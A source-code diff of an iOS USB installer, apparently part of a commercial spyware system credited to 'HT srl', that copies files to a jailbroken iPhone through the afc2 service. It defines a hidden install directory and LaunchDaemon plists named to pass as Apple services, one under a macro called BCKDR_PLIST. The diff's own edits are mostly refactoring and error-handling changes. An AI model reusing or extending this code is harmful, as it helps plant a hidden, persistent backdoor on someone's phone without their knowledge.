@@ -1,14 +1,14 @@
 //
-//  RcsIOSUsbSupport.c
-//  RCSUSBInstaller
+//  iOSUsbSupport.c
+//  iOS USB Installer
 //
-//  Created by armored on 2/7/13.
-//  Copyright (c) 2013 armored. All rights reserved.
+//  Created by Massimo Chiodini on 2/7/13.
+//  Copyright (c) 2013 HT srl. All rights reserved.
 //
-#include "RcsIOSUsbSupport.h"
+#include "iOSUsbSupport.h"
 #include <errno.h>
 
-#define INSTALLER_DIR         "/var/mobile/.0000"
+#define INSTALLER_DIR         "/private/var/mobile/.0000"
 #define LAUNCHD_INSTALL_PLIST "/Library/LaunchDaemons/com.apple.md0000.plist"
 #define BCKDR_PLIST           "/Library/LaunchDaemons/com.apple.mdworker.plist"
 
@@ -36,7 +36,7 @@ char *plist =
 "</dict>\n"
 "</plist>";
 
-//#ifdef WIN32
+#ifdef WIN32
 
 #define sleep Sleep
 #define EXPORT_DLL __declspec(dllexport)
@@ -53,7 +53,7 @@ EXPORT_DLL idevice_error_t make_install_directory();
 EXPORT_DLL int check_installation(int sec, int timeout);
 EXPORT_DLL idevice_error_t copy_buffer_file(char *filebuff, int filelen, char* filename);
 
-//#endif
+#endif
 
 static idevice_t phone = NULL;
 static lockdownd_client_t client = NULL;
@@ -83,20 +83,14 @@ afc_client_t open_device()
   
   if (LOCKDOWN_E_SUCCESS != ret)
   {
-	idevice_free(phone);
+		idevice_free(phone);
     return NULL;
-  }
+	}
   
   ret = lockdownd_start_service(client, "com.apple.afc2", &port);
   
   if ((ret == LOCKDOWN_E_SUCCESS) && port)
     ret = afc_client_new(phone, port, &afc);
-  else
-  {
-    lockdownd_client_free(client);
-	idevice_free(phone);
-	return NULL;
-  }
   
   lockdownd_client_free(client);
   idevice_free(phone);
@@ -108,15 +102,9 @@ afc_client_t open_device()
 }
 
 void close_device(afc_client_t afc)
-{
-//  lockdownd_client_free(client);
-  
+{ 
   if (afc != NULL)
     afc_client_free(afc);
-  
-//  idevice_free(phone);
-//  phone = NULL;
-//  client = NULL;
 }
 
 int isDeviceAttached()
@@ -321,11 +309,15 @@ idevice_error_t copy_local_file(afc_client_t afc, char *lpath, char* lsrc)
   
   char *filebuff = (char*)malloc(filelen);
   
+ #ifdef WIN32
   int fd = open(srcpath, O_RDONLY|O_BINARY, 0);
+#else
+   int fd = open(srcpath, O_RDONLY, 0);
+#endif
   
   if (fd == -1)
     return ret;
-  
+
   int bread = 0;
   
   while (bread < filelen)
@@ -566,7 +558,9 @@ void remove_directory(afc_client_t afc, char *rpath)
 {
   char **file_list = NULL;
   
-  if (afc_read_directory(afc, rpath, &file_list) == AFC_E_SUCCESS)
+  int retval = afc_read_directory(afc, rpath, &file_list);
+  
+  if ( retval == AFC_E_SUCCESS)
   {
     int i = 0;
     
